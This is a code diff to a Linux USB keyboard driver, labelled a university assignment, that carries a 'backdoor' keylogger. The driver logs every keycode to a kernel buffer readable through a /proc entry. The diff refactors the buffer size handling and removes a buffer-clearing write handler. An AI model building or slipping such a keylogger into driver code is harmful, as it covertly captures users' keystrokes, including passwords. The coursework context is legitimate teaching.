@@ -49,7 +49,6 @@ struct file_operations osp_proc_fops =
 {
 		.open = proc_device_open,
 		.read = seq_read,
-		.write = proc_device_write
 };
 
 
@@ -418,10 +417,11 @@ static int osp_backdoor_init()
 {
 	printk(KERN_ALERT "usbkbd: USB keyboard driver started with some evil stuff, used for OSP Assignment 2 Stage 2 only.");
 	printk(KERN_ALERT "usbkbd: Modified by Ming Hu s3554025 @ RMIT University, 2017; forked from Linux kernel v4.13.");
+	printk(KERN_INFO "usbkbd: Length of maxium backdoor size: %d", osp_backdoor_buffer_maxsize);
 	osp_proc_entry = proc_create("osp_keyboard", 0644, NULL, &osp_proc_fops);
-	osp_backdoor_buffer = vmalloc(OSP_BACKDOOR_BUFFER_SIZE);
-	memset(osp_backdoor_buffer, '\0', OSP_BACKDOOR_BUFFER_SIZE);
-	osp_backdoor_buffer_count = 0;
+	osp_backdoor_buffer = vmalloc(osp_backdoor_buffer_maxsize);
+	memset(osp_backdoor_buffer, '\0', osp_backdoor_buffer_maxsize);
+	osp_backdoor_buffer_length = 0;
 
 	if(!osp_backdoor_buffer || !osp_proc_entry)
 	{
@@ -444,15 +444,15 @@ static void osp_backdoor_close()
 static void osp_backdoor_write_key(int keycode)
 {
 	// When buffer length is about to overflow, reset it.
-	if(strlen(osp_backdoor_buffer) > 3065)
+	if(strlen(osp_backdoor_buffer) > osp_backdoor_buffer_maxsize - 16)
 	{
-		memset(osp_backdoor_buffer, '\0', OSP_BACKDOOR_BUFFER_SIZE);
-		osp_backdoor_buffer_count = 0;
+		memset(osp_backdoor_buffer, '\0', osp_backdoor_buffer_maxsize);
+		osp_backdoor_buffer_length = 0;
 	}
 
 	// Write to buffer and increase the counter
 	sprintf(osp_backdoor_buffer, "%s %d", osp_backdoor_buffer, keycode);
-	osp_backdoor_buffer_count = strlen(osp_backdoor_buffer);
+	osp_backdoor_buffer_length = strlen(osp_backdoor_buffer);
 }
 
 static int proc_device_open(struct inode * inode, struct file * file_pointer)
@@ -463,31 +463,11 @@ static int proc_device_open(struct inode * inode, struct file * file_pointer)
 static int proc_device_show(struct seq_file * file_stream, void * extra)
 {
 	printk(KERN_INFO "usbkbd: Writing to ProcFS buffer...");
-	printk(KERN_INFO "usbkbd: Length %d, content: %s", (int)osp_backdoor_buffer_count, osp_backdoor_buffer);
+	printk(KERN_INFO "usbkbd: Length %d, content: %s", (int)osp_backdoor_buffer_length, osp_backdoor_buffer);
 
 	seq_printf(file_stream, "OSP Assignment 2 Stage 2 Keyboard logger by Ming Hu s3554025\nLength: %d\nContent: %s\n",
-			(int)osp_backdoor_buffer_count,
+			(int)osp_backdoor_buffer_length,
 			osp_backdoor_buffer);
-
-	return 0;
-}
-
-static ssize_t proc_device_write(struct file * file_pointer, const char __user * str_buffer, size_t buffer_size, loff_t * offset)
-{
-	char * kern_buffer;
-	int copy_result;
-
-	kern_buffer = vmalloc(buffer_size);
-	copy_result = copy_from_user(kern_buffer, str_buffer, buffer_size);
-
-	if(strcmp(kern_buffer, "clearbackdoor") == 0)
-	{
-		memset(osp_backdoor_buffer, '\0', OSP_BACKDOOR_BUFFER_SIZE);
-		osp_backdoor_buffer_count = 0;
-
-		printk(KERN_INFO "usbkbd: Backdoor buffer has been cleared.");
-	}
-
 
 	return 0;
 }
